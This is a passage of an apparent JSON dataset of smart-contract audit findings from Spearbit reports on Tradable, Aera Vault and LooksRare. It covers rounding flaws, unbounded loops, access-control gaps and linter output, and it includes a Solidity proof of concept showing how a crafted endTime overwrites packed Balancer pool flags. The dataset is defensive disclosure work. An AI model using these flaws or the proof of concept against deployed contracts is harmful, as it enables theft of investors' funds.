tokens. Exploit Scenario: USDT with fee enabled is added into the system. When an investor answers a capital call and submits the funds for it, the capital recipient receives less than they asked for; and the investor receives more deal tokens than the amount that they actually submitted.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: High Risk"
        ]
    },
    {
        "title": "PayoutManager::_initiatePrincipalPayout totalTokensToBurn can be greater than totalSupply due to roundings",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "Due to multiple down roundings, the onchain payout amount can be slightly bigger than the maximum (e.g totalTokensToBurn > totalSupply). Scenario: -Initial state:  Alice balance: 250 (onchain).  Bob balance: 250 (onchain).  Charlie balance: 250 (fiat).  David balance: 250 (fiat). Deal admin wants to initiate a full principal payout, so for a total of 1000. The max value he should be able to provide as on chain payout should be 500. Let's see what happens if the deal admin provides 501 instead: 1. fiatPayoutAmount is computed to be 501: 13 uint256 fiatPayoutAmount = (onchainAccountsTotalBalance > 0) ? payoutAmount.mulDiv(fiatAccountsTotalBalance, onchainAccountsTotalBalance) : 0 2. As a result totalTokensToBurn is computed to be 1002. 3. Now iterating over accounts, and computing individual amounts to burn which are rounded down: Alice, Bob, Charlie, David: (250*1002)/1000 == 250 Since the individual amounts to burn are equal to the balances of each participant, the call succeeds.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Open access of verifyEligibility, checkAccountEligibility & isEligibleAccount functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The protocol has these three open access functions:  QuadrataKYCVerifier.verifyEligibility  DealManager.checkAccountEligibility  DealManager.isEligibleAccount The functions perform an account's eligibility check based upon a deal's requirement. The Quadrata's QuadReader.getAttributesBulk function has these statements: bool hasPreapproval = governance.preapproval(msg.sender); require(hasPreapproval, \"SENDER_NOT_AUTHORIZED\"); which shows that Quadrata exposes attributes to whitelisted readers only. Quadrata may whitelist Tradable's QuadrataKYCVerifier contract to read attribute data but Tradable is currently exposing that data to be read by all on-chain smart contracts. Due to this, any on-chain contract can perform Quadrata based KYC check for an account on behalf of Tradable. Quadrata will always assume that the KYC check call is coming from Tradable protocol. In case Quadrata imple- ments an access fee then Tradable can be forced to pay more fees than expected by abusing the mentioned open access functions.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Investors have no control over the amount of service fee they pay on interest",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The Tradable protocol has two fees  Origination fee: it is the fee taken on amounts that investors invest.  Service fee: it is the fee taken on amount of interest generated by the investments. When investing into a deal the investors has the ability to set/view the max origination fee. But since the Tradable DEAL_ADMIN can change the service fee percentage using _setServiceFee during a deal's lifespan, the investors will never to sure about the max service fee they will pay at the end of deal term. Investors can be forced to pay higher service fee than they originally expected.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "BaseManager::__BaseManager_init is missing onlyInitializing modifier",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The __BaseManager_init is the initialization function of abstract BaseManager contract which gets invoked in DealManager.initialize function. Initialization functions must be only allowed to be invoked during the contract initialization. However the BaseMan- ager.__BaseManager_init can currently be invoked at any point in time by a contract which inherits BaseManager.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "yieldDistribution iterates over unbounded yieldRecipients array",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The Deal.yieldDistribution function is used whenever yield is distributed in DealMan- ager.initiateInterestPayout. the entire Deal's $.yieldRecipients state array. The function iterates over This array never shrinks, yield recipients are only ever pushed onto it as soon as an account receives a balance. Note that while there is a maxHoldersLimit limit for the current holders ($.currentHolders), this limit does not apply to $.yieldRecipients as old holders are replaced by new holders (through mint and burn or forceTrans- fer). Once the array becomes too large, the yield distribution's gas usage might not fit into a single block anymore. 15",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "InvestmentManager::_issueCapitalCall Capital calls are silently overridden",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "Capital calls can be used by an originator to ask for investors to provide more funds. However when one capital call has already been issued for an investor, issuing another one to the same investor will silently override the existing capital call. There are two mappings to keep track of issued capital calls:  capitalCalls  investorCalls When a new capital call is added over an existing one, the value in investorCalls is updated for the investor, whereas a new value is simply added for capitalCalls at the new id. This means that in the case 2 capital calls have been added for an investor, the investor can answer any of those 2 capital calls, but only the most recent one will be shown by the view functions capital- Calls(address investor), capitalCalls()",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unnecessary second binary search for _yieldAt",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The Deal._yieldAt function looks at timestamp. It first performs a binary search to find the closest checkpoint older or at the search timestamp (upperCheckpointLookup). Afterwards, a second binary search is performed to find the closest checkpoint newer than the search timestamp (lowerCheckpointLookup). the closest checkpoints left and right of",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Assumptions made by off-chain smart contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The smart contract system relies heavily on the DealAdmin calling functions frequent enough to keep the smart contracts as a single source of truth. The below highlight assumptions that we have made of the behaviour in the off-chain system during this review:  The DealAdmin chooses when to mint deal tokens and must be matched timely to off-chain actions:  Tradable has specific requirements of interest accrual to specific parties while off-chain wire transfers are in flight, thus the DealAdmin must only mint deal tokens when a party receives their respective tokens, and when they want interest for different parties to start accruing.  Tradable must also correctly mint and burn tokens, especially for fiat-accounts, where the number of tokens they hold is representative of an off-chain value.  Tradable determines when deals are deployed, and must make sure that any off-chain contracts are signed before on-chain interaction begins.  Tradable determines when to issue a capital call to an investor on behalf of a user requesting said capital call, and is trued to put the correct amount and due date on-chain.  Tradable is trusted such that it should not cancel a capital call that was not intended to be cancelled.  Tradable updates whatever necessary on-chain data is required in order to have a well-informed decision about the state of a deal. This can include the price, the net asset value, and other fields.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "PayoutManager::_initiatePrincipalPayout Edge case preventing all supply to be burnt",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The function initiatePrincipalPayout can be used to repay investors of a deal, and burn all of the deal tokens, if the repayment is full. However there is an edge case which would prevent burning all of the tokens when some tokens have been burnt already, and which is due to difference of precision between underlying and deal token. Scenario:  paymentCurrency is USDC with 6 decimals.  Alice has an on chain account. 1. Admin issues a capital call for Alice. Alice mints for a deposit of 1000 USDC, 1000 deal tokens (1000e18). 2. Admin burns (5e18 - DUST) deal tokens from Alice. Alice balance in deal tokens is now (995e18 + DUST). 3. Admin is unable to issue a full principal payout for Alice, because of the difference in precision between USDC (6 decimals) and deal token (18 decimals). This is due to the fact that the number of tokens to burn from Alice is determined from the payout amount denominated in USDC, and which is then scaled up using currencyToDealTokens: 18 // Calculate the total amount of tokens to burn. uint256 totalTokensToBurn = currencyToDealTokens(payoutAmount + fiatPayoutAmount); So by providing the max amount allowed: 995 USDC, Alice keeps DUST of deal tokens.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "DEAL_MAX_INVESTMENT_AMOUNT check is superfluous",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "DEAL_MAX_INVESTMENT_AMOUNT is set to be type(uint128).max which is not a realistic value for limiting investment size. There are two distinct cases where this check is used:  Issuing a capital call, in which case the DEAL_ADMIN can provide an arbitrary amount, because no funds In this case the check can prevent some amount values, but there are still are transferred at that time. unreasonable amounts (below type(uint128).max) which would be accepted.  Submitting an offer, in this case the amount is bounded by the balance of the submitter, since funds are transferred straight away.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "Deal::price function can return incorrect or outdated price values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The price value of deal tokens is determined by net asset value / total supply. Since NAV needs to be updated manually by admin. In case there is a lag in the NAV updates then price will return incorrect price. For example, suppose that initially Nav = 100 & supply = 100 so price is 1. After some time 100 more deal tokens get minted so now price will be 100/200 = 0.5 (assuming a delay in NAV update). Incorrect price will be returned. Similarly opposite scenario occurs when deal tokens are burned and NAV update is delayed. The function also returns the most recent timestamp between supplyUpdateTimestamp & nav.timestamp. When the above explained delay scenario happens, the function will also return the more recent supplyUpdateTimestamp timestamp further tricking the price consumer into trusting the returned price. The current natspec of Price.timestamp type says it is The price latest update timestamp.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "_beaconProxyBytecodeHash depends on specific compiler used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "zkSync uses a different bytecode hash format and the deployments work differently, the bytecode for a bytecode hash must be known beforehand. The _beaconProxyBytecodeHash function returns the bytecode hash as the word at offset of 36 bytes of type(BeaconProxy).creationCode. function _beaconProxyBytecodeHash() private pure returns (bytes32 bytecodeHash) { bytes memory creationCode = type(BeaconProxy).creationCode; assembly { // +32 to skip the length of creationCode, + 36 bytecodeHash := mload(add(creationCode, 68)) } }",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "for loop iteration for contracts can be unbounded",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The contracts contain functions that loop over lists that can grow significantly in size. Once these contracts store enough data, this can potentially run out of gas. For example, the DealRegistry function has a list function that iterates through all the deals that have been created to return the address of all deals. Once the list of deals grows significantly, this function can become problematic:  DealRegistry.sol#L80-L90: /// @inheritdoc IDealRegistry function list() external view returns (address[] memory) { EnumerableMap.Bytes32ToAddressMap storage deals = _storage().deals; uint256 length = deals.length(); address[] memory result = new address[](length); for (uint256 i = 0; i < length; i++) { (, address deal) = deals.at(i); result[i] = deal; } return result; } The same list is iterated over in DealPriceEngine::dealPrices() to calculate the prices of all deals. 20  DealPriceEngine.sol#L73-L79: function dealPrices() external view returns (DealPrice[] memory) { address[] memory dealAddresses = _storage().dealRegistry.list(); uint256 length = dealAddresses.length; DealPrice[] memory prices = new DealPrice[](length); for (uint256 i = 0; i < length; i++) { prices[i] = _price(IDeal(dealAddresses[i])); }",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing short-circuit to halt yield period calculation for periods with no checkpoints",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "If the contract has not accrued any yield, the _yieldForPeriod will needlessly call the _yieldAt function when it could instead, short circuit and just return 0 directly. The _yieldForPeriod function uses the _yieldAt function which immediately returns zero if there are no check- points. In essence, the _yieldAt function will be called twice, both times returning zero, and the _yieldForPeriod will just return a result of 0. function _yieldAt( Checkpoints.Trace208 storage checkpoints, uint48 timestamp, uint256 tokenBalance ) { private view returns (uint256) // If there are no checkpoints, return 0. if (checkpoints.length() == 0) return 0; Given the fact that the yieldDistribution function iterates over the yield period for every single recipient in the for loop below, it would save on logic and gas costs to halt as early as a 0 period is known. 21 contexts. the period. /// @notice Returns the yield distribution for a period. /// @dev The yield is distributed pro rata based on the deal historical holding share of each holder in ,! /// @dev CAUTION: This function is gas-intensive and should be used with caution in transactional ,! /// @param periodStartTime The start timestamp. /// @param periodEndTime The end timestamp. function yieldDistribution( uint48 periodStartTime, uint48 periodEndTime ) { public view assertValidPeriod(periodStartTime, periodEndTime) returns (YieldRecipient[] memory yieldRecipients) DealStorage storage $ = _storage(); yieldRecipients = new YieldRecipient[]($.yieldRecipients.length()); uint256 recipientsCount = 0; for (uint256 i = 0; i < yieldRecipients.length; i++) { address account = $.yieldRecipients.at(i); uint256 yield = _yieldForPeriod($.accountYieldCheckpoints[account], periodStartTime, periodEndTime, ,! balanceOf(account)); if (yield > 0) { // forgefmt: disable-next-item yieldRecipients[recipientsCount++] = YieldRecipient({ account: account, yield: yield, isFiatAccount: $.fiatAccounts.contains(account) }); } } if (recipientsCount < yieldRecipients.length) { assembly { mstore(yieldRecipients, recipientsCount) } } }",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "PayoutManager::_initiateInterestPayout should revert if yieldGenerationStart is zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "DealManager::initiateInterestPayout can be called even if no deal tokens have ever been emit- ted for the deal, and this would generate a yield period going from the timestamp 0 to periodEndTime. Although it does hinder any functionality of the protocol, this can cause bugs in tools displaying yield period data, since there would be an overly large first period.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect yield can be distributed due to insufficient period validity checks of assertValidPeriod",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The Deal::assertValidPeriod modifier looks like this: modifier assertValidPeriod(uint48 periodStartTime, uint48 periodEndTime) { if (periodStartTime >= periodEndTime) revert DealYieldInvalidPeriod(periodStartTime, periodEndTime); if (periodEndTime < yieldGenerationStart()) revert DealYieldPastLookup(periodEndTime, yieldGenerationStart()); if (periodStartTime >= clock()) revert DealYieldFutureLookup(periodStartTime, clock()); _; ,! } Also note that yieldGenerationStart function can return 0 in case no global checkpoint has been created yet. Currently the assertValidPeriod modifier doesn't sufficiently validate the periodStartTime & periodEndTime timestamps which can lead to incorrect yield distributions. Some scenarios are listed below: 1. periodStartTime can be 0 when yieldGenerationStart returns 0 . 2. periodStartTime can be any value between [0, block.timestamp - 1]. 3. periodEndTime can be any value between [yieldGenerationStart, type(uint48).max]. As the Deal._yieldAt function performs extrapolation of yield checkpoints, the scenario 3 becomes more severe. 24 Accounts can receive extrapolated yields for a future timestamp T, deal tokens of those accounts can be burned, transferred or increased before the actual timestamp T occurs, which leads to incorrect yield distribution.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "Capital calls can be issued to non KYCed users",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "Currently the DEAL_ADMIN can issue capital calls to non-KYCed (ineligible) users. Though those ineligible users cannot answer any capital call. This is because the _issueCapitalCall is missing checkAccoun- tEligibility call.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "Deal::_yieldAt - Missing safecasting the extrapolated yield checkpoint value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "In _yieldAt when the next checkpoint does not exist then the next checkpoint value is extrapolated assuming linear growth. if (!nextExists) return prevValue + ((timestamp - prevTimestamp) * tokenBalance); As tokenBalance is an uint256 the (timestamp - prevTimestamp) * tokenBalance is also casted to uint256 by default. Ideally, following the checkpoint convention throughout the Deal contract the (timestamp - prevTimestamp) * tokenBalance value should be safecasted to uint208 before performing any other arithmetic operation.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing input validations in QuadrataKYCVerifier::setDealRequirements",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The setDealRequirements simply writes the input DealKYCRequirements parameter to storage with- out validating its individual parameters. This creates two issues: 1. Empty countries array can be set as DealKYCRequirements.allowedCountries. In verifyEligibility execution is reverted if a deal's DealKYCRequirements.allowedCountries is an empty array. 2. DealKYCRequirements.maxAMLRiskScore of 0 can be set as a deal requirement. Since Quadrata returns a number [1 - 10] as AML risk score, a 0 value will make the deal unusable.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "Assert correct Deal and DealManager factory deployment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The DealFactory precomputes the beacon proxy addresses for the Deal and DealManager as there's a cyclic dependency between their addresses. However, it does not check if the actual deployed addresses match the precomputed ones.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos, Documentation & Unused Code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "There are typos and documentation errors in the code: 1. Checkpoints.sol#L184: \"Return the index of the last (most recent) checkpoint with key lower or equal than the search key\". This function returns the first index (oldest) that is strictly greater than the search key. The usage is correct and no code adjustments are required. (This has also been reported to the upstream OZ repo). 26 2. Deal.sol#L103: The Deal contract's authorization is done by checking if the caller is the DealManager con- tract. It does currently not require AccessManagedUpgradeable with the authority checks. Consider removing the dependency for Deal. 3. Constants.sol#L15 The PUBLIC role is currently not used in the contracts and deployment scripts. 4. DealFactory#L101 Natspec for DealFactory::deployDeal specifies: The deal ID is used as the salt for the create2 address. Which is currently not the case. 5. ACL.md: Rename autorizeUpgrade to authorizeUpgrade.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add explicit periodStartTime < periodEndTime check to _initiateInterestPayout",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "When PayoutManager._initiateInterestPayout distributes yield, it's important that no period can be distributed twice. As the code sets the next period start to the previous period's end time, it's important that no period end in the past can be specified. The periodStartTime < periodEndTime check is already performed downstream in _interestPayoutDistribution ! Deal.totalYield ! assertValidPeriod.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use internal setters to initialize contract state",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "Some contracts set contract state directly in their constructor or initialization function even though there is a setter function for the state. 1. InvestmentManager.sol#L58: Use _setOfferEscrowPeriod. 2. QuadrataKYCVerifier.sol#L59-L60: Use an internal _setQuadrataReader and _setAttributeMaxAge func- tion that the external setQuadrataReader and setAttributeMaxAge will also use.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename __CapitalCallManager_init to __InvestmentManager_init",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "The InvestmentManager's initialization function is currently called __CapitalCallManager_init.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "Using currencyToDealTokens and dealTokensToCurrency may result in rounding errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "These two functions are expected to be inverses of each other. However, the rounding directions specified here can result in this inverse assumption failing. For example, take a simple example such as a currency amount of 1e18+1: *currencyToDeal function -- * currencyAmount = 1e18 + 1 = (1e18+1) * 1e18 = 1e36+1e18 *dealTokensToCurrency function -- * dealTokenAmount = 1e36+1e18 = (1e36+1e18)/1e18 = 1e36/1e18 + 1e18/1e18 = 1e18 For larger values, x/scalingFactor will be truncated when downscaling which can cause unexpected behaviour. However, since dealTokensToCurrency is not used in this codebase, this is marked as an \"informational\" issue.",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fiat/onchain account state must be set prior to distribution",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tradable-Spearbit-Security-Review-July2024.pdf",
        "body": "**Adding/removing a fiat account can increase/decrease fiatAccountsTotalYield if the account had a balance during that period. This will in turn decrease/increase the onchainAccountsTotalYield computed in PayoutManager._interestPayoutDistribution. The yield payout can be wrong when it uses the wrong baseline which can happen in the following cases. 1. A fiat account Deal holder is not set as a fiat account in Deal when the yield distribution happens. 2. An onchain account Deal holder is set as a fiat account in Deal when the yield distribution happens. 3. An account received Deal tokens from both fiat and onchain payments. The account's balance is always fully counted as either fiat or onchain, never partially. The onchain payout parameter payoutAmount must also fully account the balance for either offchain or onchain payment. 28",
        "labels": [
            "Spearbit",
            "Tradable",
            "Severity: Informational"
        ]
    },
    {
        "title": "Important Balancer fields can be overwritten by EndTime",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
        "body": "Balancers ManagedPool uses 32 bit values for startTime and endTime but it does not verify if those values exist within that range. Values are stored in a 32-byte _miscData slot in BasePool via the insertUint32() function. Nevertheless, this function does not strip any excess bits, resulting in other fields stored in _miscData to be overwritten. In the version that Aera Vault uses only the \"restrict LP\" field can be overwritten and by carefully crafting the value of endTime, the \"restrict LP\" boolean can be switched off, allowing anyone to use joinPool. The Manager could cause this behavior via the updateWeightsGradually() function while the Owner could do it via enableTradingWithWeights(). Note: This issue has been reported to Balancer by the Spearbit team. contract ManagedPool is BaseWeightedPool, ReentrancyGuard { // f14de92ac443d6daf1f3a42025b1ecdb8918f22e 32 bits | 1 bit 1 bit | | restrict LP | end time 32 bits | ] 7 bits | start time | total tokens | swap flag ] | // [ 64 bits // [ reserved | // |MSB | 119 bits | unused function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... { ... _setMiscData( _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, ,! _END_TIME_OFFSET) ); // this convert the values to 32 bits ... } } In the latest version of ManagedPool many more fields can be overwritten, including:  LP flag  Fee end/Fee start  Swap flag contract ManagedPool is BaseWeightedPool, AumProtocolFeeCache, ReentrancyGuard { // current version // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB 1 bit | 31 bits | | 31 bits 32 bits | 64 bits | 32 bits 1 bit | | The following POC shows how fields can be manipulated. // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; import \"hardhat/console.sol\"; contract checkbalancer { uint256 private constant _MASK_1 = 2**(1) - 1; uint256 private constant _MASK_31 = 2**(31) - 1; uint256 private constant _MASK_32 = 2**(32) - 1; uint256 private constant _MASK_64 = 2**(64) - 1; uint256 private constant _MASK_192 = 2**(192) - 1; 5 | | 1 bit 64 bits | | 31 bits 1 bit | 31 bits | // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB uint256 private constant _WEIGHT_START_TIME_OFFSET = 0; uint256 private constant _WEIGHT_END_TIME_OFFSET = 32; uint256 private constant _END_SWAP_FEE_PERCENTAGE_OFFSET = 64; uint256 private constant _FEE_START_TIME_OFFSET = 128; uint256 private constant _SWAP_ENABLED_OFFSET = 159; uint256 private constant _FEE_END_TIME_OFFSET = 160; uint256 private constant _MUST_ALLOWLIST_LPS_OFFSET = 191; uint256 private constant _SWAP_FEE_PERCENTAGE_OFFSET = 192; 32 bits | 32 bits function insertUint32(bytes32 word,uint256 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_32 << offset)); return clearedWord | bytes32(value << offset); } function decodeUint31(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_31; } function decodeUint32(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_32; } function decodeUint64(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_64; } function decodeBool(bytes32 word, uint256 offset) internal pure returns (bool) { return (uint256(word >> offset) & _MASK_1) == 1; } function insertBits192(bytes32 word,bytes32 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_192 << offset)); return clearedWord | bytes32((uint256(value) & _MASK_192) << offset); } constructor() { bytes32 poolState; bytes32 miscData; uint startTime = 1 + 2*2**32; uint endTime = 3 + 4*2**32 + 5*2**(32+64) + 2**(32+64+31) + 6*2**(32+64+31+1) + ,! 2**(32+64+31+1+31) + 7*2**(32+64+31+1+31+1); poolState = insertUint32(poolState,startTime, _WEIGHT_START_TIME_OFFSET); poolState = insertUint32(poolState,endTime, _WEIGHT_END_TIME_OFFSET); miscData = insertBits192(miscData,poolState,0); decodeUint32(miscData, console.log(\"startTime\", console.log(\"endTime\", decodeUint32(miscData, console.log(\"endSwapFeePercentage\", decodeUint64(miscData, _WEIGHT_START_TIME_OFFSET)); // 1 // 3 _WEIGHT_END_TIME_OFFSET)); _END_SWAP_FEE_PERCENTAGE_OFFSET)); ,! // 4 console.log(\"Fee startTime\", console.log(\"Swap enabled\", console.log(\"Fee endTime\", console.log(\"AllowlistLP\", decodeUint31(miscData, decodeBool(miscData, decodeUint31(miscData, decodeBool(miscData, _FEE_START_TIME_OFFSET)); // 5 _SWAP_ENABLED_OFFSET)); // true _FEE_END_TIME_OFFSET)); // 6 _MUST_ALLOWLIST_LPS_OFFSET)); // ,! true console.log(\"Swap fee percentage\", console.log(\"Swap fee percentage\", decodeUint64(poolState, _SWAP_FEE_PERCENTAGE_OFFSET)); // 7 _SWAP_FEE_PERCENTAGE_OFFSET)); // 0 decodeUint64(miscData, due to miscData conversion } ,! }",
        "labels": [
            "Spearbit",
            "Gauntlet",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Keep maximum allowed number of characters per line to 120.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "There are a few long lines in the code base. contracts/executionStrategies/StrategyCollectionOffer.sol 21:2 27:2 29:2 30:2 67:2 69:2 70:2 118:2 119:2 error error error error error error error error error Line length must be no more than 120 but current length is 127 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length contracts/executionStrategies/StrategyDutchAuction.sol 20:2 22:2 23:2 26:5 70:31 85:2 86:2 92:5 error error error warning warning error error warning Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 9 but allowed no more than 7 Avoid to make time-based decisions in your business logic Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 8 but allowed no more than 7 max-line-length max-line-length max-line-length code-complexity not-rely-on-time max-line-length max-line-length code-complexity contracts/executionStrategies/StrategyItemIdsRange.sol 15:2 20:2 21:2 22:2 23:2 25:5 100:2 101:2 error error error error error warning error error Line length must be no more than 120 but current length is 142 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 12 but allowed no more than 7 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length code-complexity max-line-length max-line-length contracts/helpers/OrderValidatorV2A.sol 40:2 ,! 53:2 ,! error Line length must be no more than 120 but current length is 121 error Line length must be no more than 120 but current length is 121 max-line-length max-line-length 69 225:2 ,! 279:2 ,! 498:24 ,! 501:26 ,! 511:2 ,! 593:5 ,! 662:5 ,! 758:5 ,! 830:5 ,! 843:17 ,! 850:17 ,! 906:5 ,! 963:5 ,! 12:2 ,! 18:2 ,! 23:2 ,! 49:5 ,! 81:2 ,! 144:2 ,! error Line length must be no more than 120 but current length is 127 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Avoid to make time-based decisions in your business logic not-rely-on-time warning Avoid to make time-based decisions in your business logic not-rely-on-time error Line length must be no more than 120 but current length is 143 max-line-length warning Function has cyclomatic complexity 9 but allowed no more than 7 warning Function has cyclomatic complexity 9 but allowed no more than 7 code-complexity code-complexity warning Function order is incorrect, internal view function can not go after internal pure function (line 727) ordering warning Function has cyclomatic complexity 10 but allowed no more than 7 code-complexity warning Avoid to use inline assembly. It is acceptable only in rare cases no-inline-assembly warning Avoid to use inline assembly. It is acceptable only in rare cases warning Function has cyclomatic complexity 8 but allowed no more than 7 no-inline-assembly warning Function has cyclomatic complexity 8 but allowed no more than 7 code-complexity code-complexity contracts/helpers/ValidationCodeConstants.sol 17:2 18:2 error error Line length must be no more than 120 but current length is 129 Line length must be no more than 120 but current length is 121 max-line-length max-line-length contracts/interfaces/ILooksRareProtocol.sol 160:2 error Line length must be no more than 120 but current length is 122 max-line-length contracts/libraries/OrderStructs.sol error Line length must be no more than 120 but current length is 292 error Line length must be no more than 120 but current length is 292 max-line-length max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Function order is incorrect, struct definition can not go after state variable declaration (line 26) ordering error Line length must be no more than 120 but current length is 128 max-line-length error Line length must be no more than 120 but current length is 131 max-line-length 49 problems (34 errors, 